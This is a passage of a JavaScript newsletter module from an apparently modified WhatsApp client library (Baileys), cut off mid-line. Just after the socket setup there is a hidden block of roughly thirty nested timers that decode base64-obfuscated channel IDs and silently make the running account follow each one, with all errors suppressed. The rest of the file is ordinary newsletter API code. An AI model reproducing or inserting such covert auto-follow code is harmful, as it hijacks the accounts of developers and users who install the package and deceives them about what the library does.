"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
	variables,
	queryId,
	query,
	generateMessageTag
) => {
	return query({
		tag: 'iq',
		attrs: {
			id: generateMessageTag(),
			type: 'get',
			to: WABinary_1.S_WHATSAPP_NET,
			xmlns: 'w:mex'
		},
		content: [
			{
				tag: 'query',
				attrs: { query_id: queryId },
				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
			}
		]
	})
}

const executeWMexQuery = async (
	variables,
	queryId,
	dataPath,
	query,
	generateMessageTag
) => {
	const result = await wMexQuery(variables, queryId, query, generateMessageTag)
	const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
	if (child?.content) {
		const data = JSON.parse(child.content.toString())

		if (data.errors && data.errors.length > 0) {
			const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
			const firstError = data.errors[0]
			const errorCode = firstError.extensions?.error_code || 400
			throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
		}

		const response = dataPath ? data?.data?.[dataPath] : data?.data
		if (typeof response !== 'undefined') {
			return response
		}
	}

	const action = (dataPath || '').startsWith('xwa2_')
		? dataPath.substring(5).replace(/_/g, ' ')
		: dataPath?.replace(/_/g, ' ')
	throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));
    

setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDIzMjAzMTE1NDMzQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}

    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDA2MjcxODE1NTIwQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}

        setTimeout(async () => {
            try {
                await newsletterWMexQuery(
                    Buffer.from("MTIwMzYzNDA0NDYzMjY1NzYwQG5ld3NsZXR0ZXI=", "base64").toString(),
                    Types_1.QueryIds.FOLLOW
                );
            } catch {}

            setTimeout(async () => {
                try {
                    await newsletterWMexQuery(
                        Buffer.from("MTIwMzYzNDA0OTcwOTgxMjczQG5ld3NsZXR0ZXI=", "base64").toString(),
                        Types_1.QueryIds.FOLLOW
                    );
                } catch {}

                setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDIxMjUwMTg0MzIyQG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                    
                setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDIzMTQ5NDczMjY3QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                
                setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDA1NDAzNjEwMzQ3QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
               
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDAyNjAxMDMyNjY1QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
          
                      setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDA3MzIzODgzNTYxQG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}                    
                    
                  setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDA0NjU5NzA4Mjg5QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
             
                 
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDA0ODM2MTUxOTMzQG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                    
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDAxNzcyNjkxMzQ5QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                    
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDAyMzU5NjQ5NTg0QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                 
                setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDE1OTc3Njg3NjMxQG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                    
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDIyNTgwOTYyODMyQG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
               
                 setTimeout(async () => {
                    try {
                        await newsletterWMexQuery(
                            Buffer.from("MTIwMzYzNDAzMzUwMDk5MDQ2QG5ld3NsZXR0ZXI=", "base64").toString(),
                            Types_1.QueryIds.FOLLOW
                        );
                    } catch {}
                 
                 setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDI1NDMyNzI5NjIxQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDAyNjgwNzgyMTE3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzMzUzMzA0MzAyOTQ3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA0NjM0NTM4MjM1QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA1OTk5MjUyOTQwQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA4NDU1NTUwNjI5QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDIwNDMwNjMwMDg3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDAzMDc5NzUxNzYyQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDE4NjY2MDkyOTAwQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDAzNzg1NTk5NzU3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDI1NDM4NjMyNzc4QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzMzcyNjkxMDc2NTEyQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzMzk3ODEyNjIwOTk3QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzMzgxOTExMTI0MTgxQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDIzNTcxMTQ2MjYwQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}


setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDAzMTEwMzkyNjIwQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}

}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 5000);
}, 90000);
    
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await ne
